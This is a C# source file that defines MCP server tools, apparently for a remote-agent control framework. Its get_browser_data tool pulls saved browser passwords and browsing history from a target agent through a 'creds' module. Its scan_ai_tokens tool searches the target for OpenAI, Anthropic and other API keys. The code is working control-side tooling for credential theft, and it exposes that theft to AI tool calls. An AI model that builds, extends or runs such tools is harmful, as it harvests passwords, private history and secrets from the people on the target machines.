using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Service.Services;
using Microsoft.AspNetCore.Http;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class DataTools
{
    /// <summary>
    /// 注意：agent 侧 creds 模块的 browser/browser_search op 返回的是
    /// 密码与历史记录的混合列表（无独立 op），因此不再暴露两个名义上分离的工具。
    /// </summary>
    [McpServerTool, Description("Extract browser data (saved passwords AND browsing history, returned mixed) from an agent (requires Admin). Keyword search covers both passwords and history")]
    public static async Task<string> get_browser_data(
        IHttpContextAccessor http,
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Browser: chrome, edge, or all (default all)")] string browser = "all",
        [Description("Search keyword (optional; enables search mode across passwords and history)")] string? keyword = null,
        [Description("Offset for pagination (default 0)")] int offset = 0,
        [Description("Limit for pagination (default 100)")] int limit = 100,
        CancellationToken ct = default)
    {
        var caller = McpUtils.GetCaller(http);
        var adminError = McpUtils.RequireAdmin(caller, "get_browser_data");
        if (adminError.Length > 0) return adminError;

        if (!string.IsNullOrEmpty(keyword))
            return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
                new { op = "browser_search", type = browser, keyword }, ct, TimeSpan.FromSeconds(60));
        return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
            new { op = "browser", type = browser, offset, limit }, ct, TimeSpan.FromSeconds(60));
    }

    [McpServerTool, Description("Scan for AI API keys (OpenAI, Anthropic, etc.) on an agent (requires Admin)")]
    public static async Task<string> scan_ai_tokens(
        IHttpContextAccessor http,
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        CancellationToken ct = default)
    {
        var caller = McpUtils.GetCaller(http);
        var adminError = McpUtils.RequireAdmin(caller, "scan_ai_tokens");
        if (adminError.Length > 0) return adminError;

        return await McpUtils.RelayOrError(relay, agents, caller, agentId, "creds",
            new { op = "ai" }, ct, TimeSpan.FromSeconds(60));
    }
}
